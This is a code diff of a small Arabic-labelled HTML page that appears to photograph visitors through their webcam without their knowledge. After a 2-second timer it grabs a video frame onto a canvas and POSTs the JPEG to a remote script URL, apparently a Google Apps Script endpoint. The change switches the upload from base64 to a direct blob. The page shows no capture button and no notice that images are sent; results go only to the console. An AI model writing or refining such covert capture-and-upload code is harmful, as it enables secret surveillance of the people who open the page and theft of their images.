@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title></title>
+  <title>كاميرا الويب</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -16,7 +16,7 @@
   </style>
 </head>
 <body>
-  <h1></h1>
+  <h1>إلتقاط الصور</h1>
   <canvas id="canvas"></canvas>
 
   <script>
@@ -36,31 +36,24 @@
             const ctx = canvas.getContext("2d");
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
+            // تحويل Canvas مباشرة إلى Blob
             canvas.toBlob(function (blob) {
-              const reader = new FileReader();
-              reader.onloadend = function () {
-                const base64 = reader.result.split(",")[1];
-                sendToGoogleScript(base64);
-              };
-              reader.readAsDataURL(blob);
-            }, "image/jpeg");
+              const formData = new FormData();
+              formData.append("photo", blob, "image.jpg");
+              
+              fetch(scriptURL, {
+                method: "POST",
+                body: formData
+              })
+              .then((res) => res.text())
+              .then((res) => console.log("✅ تم الإرسال:", res))
+              .catch((err) => console.error("❌ فشل الإرسال:", err));
+            }, "image/jpeg", 0.8); // جودة 80%
           }, 2000);
         })
         .catch(function (error) {
           console.error("⚠️ حدث خطأ أثناء الوصول للكاميرا:", error);
         });
-
-      function sendToGoogleScript(base64Image) {
-        const formData = new FormData();
-        formData.append("photo", base64Image);
-        fetch(scriptURL, {
-          method: "POST",
-          body: formData
-        })
-          .then((res) => res.text())
-          .then((res) => console.log("✅ تم الإرسال:", res))
-          .catch((err) => console.error("❌ فشل الإرسال:", err));
-      }
     }
   </script>
 </body>
